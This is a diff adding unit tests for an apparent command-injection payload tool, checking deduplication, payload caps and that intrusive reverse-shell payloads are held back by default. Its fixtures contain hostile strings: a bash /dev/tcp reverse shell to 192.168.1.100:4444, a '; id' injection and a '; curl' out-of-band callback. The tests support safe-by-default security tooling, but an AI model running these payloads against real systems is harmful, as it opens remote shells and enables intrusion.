@@ -1095,6 +1095,85 @@ class GeneratorTestCase(unittest.TestCase):
             server.shutdown()
             server.server_close()
 
+    def test_build_verification_plan(self):
+        recs = [
+            make_record(payload="; id", category="basic_enum", safety="safe"),
+            make_record(payload="; id", category="basic_enum", safety="safe"),  # duplicate
+            make_record(payload="bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
+                        category="reverse_shells", safety="intrusive"),
+            make_record(payload="; curl http://tok.oob.example/", category="oob",
+                        safety="intrusive", expected_channel="interactsh",
+                        token="tok", oob_host="tok.oob.example"),
+        ]
+        lines, to_send = rcekit.build_verification_plan(
+            recs, "GET", "http://t/?x=FUZZ",
+            attacker_ip="192.168.1.100", attacker_domain="attacker.com")
+        self.assertEqual(len(to_send), 3, "duplicate payloads collapse")
+        text = "\n".join(lines)
+        self.assertIn("3 unique payloads", text)
+        self.assertIn("HIGH-IMPACT", text)
+        self.assertIn("reverse_shells", text)
+        self.assertIn("192.168.1.100", text)          # reverse-shell callback host
+        self.assertIn("oob.example", text)            # OOB callback domain
+        # --max-payloads caps what will be sent.
+        _, capped = rcekit.build_verification_plan(recs, "GET", "u", max_payloads=1)
+        self.assertEqual(len(capped), 1)
+
+
+class VerifySafeByDefaultTestCase(unittest.TestCase):
+    """The CLI must not fire high-impact payloads at a target by default."""
+
+    def _serve(self):
+        import http.server
+        import socketserver
+        import threading
+
+        class Handler(http.server.BaseHTTPRequestHandler):
+            def log_message(self, *a):
+                pass
+
+            def _ok(self):
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"ok")
+
+            do_GET = _ok
+            do_POST = _ok
+
+        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
+        port = server.server_address[1]
+        threading.Thread(target=server.serve_forever, daemon=True).start()
+        return server, port
+
+    def _run(self, *args):
+        return subprocess.run(
+            [sys.executable, str(SCRIPT), *args],
+            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120,
+        )
+
+    def test_reverse_shells_are_held_back_by_default(self):
+        server, port = self._serve()
+        try:
+            url = f"http://127.0.0.1:{port}/?x=FUZZ"
+            # Default: reverse shells are 'intrusive', so nothing is fired.
+            safe = self._run("--acknowledge-consent", "--categories", "reverse_shells",
+                             "--environments", "unix", "--verify-url", url)
+            self.assertEqual(safe.returncode, 0, safe.stderr)
+            self.assertIn("0 unique payloads to send", safe.stdout)
+            self.assertIn("--verify-active-risk intrusive", safe.stdout)
+            # Opt in: now they are included and the plan flags the high-impact set.
+            active = self._run("--acknowledge-consent", "--categories", "reverse_shells",
+                               "--environments", "unix", "--verify-active-risk", "intrusive",
+                               "--max-payloads", "15", "--verify-url", url)
+            self.assertEqual(active.returncode, 0, active.stderr)
+            self.assertIn("HIGH-IMPACT", active.stdout)
+            self.assertIn("reverse_shells", active.stdout)
+            self.assertIn("192.168.1.100", active.stdout)  # reverse-shell callback host
+            self.assertNotIn("0 unique payloads to send", active.stdout)
+        finally:
+            server.shutdown()
+            server.server_close()
+
 
 if __name__ == "__main__":
     unittest.main()
